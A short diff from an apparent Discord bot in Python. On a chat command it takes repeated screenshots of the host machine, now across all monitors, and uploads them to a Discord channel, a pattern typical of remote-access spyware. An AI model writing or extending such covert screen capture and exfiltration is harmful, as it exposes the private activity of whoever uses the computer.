@@ -145,7 +145,7 @@ class MyClient(discord.Client):
                     msg = await self.wait_for('message', check=check)
                     amount = int(msg.content)
                     for i in range(amount):
-                        im = ImageGrab.grab()
+                        im = ImageGrab.grab(all_screens=True)
                         im.save('screenshot.png')
                         await message.channel.send(file=discord.File('screenshot.png'))
                         os.remove('screenshot.png')
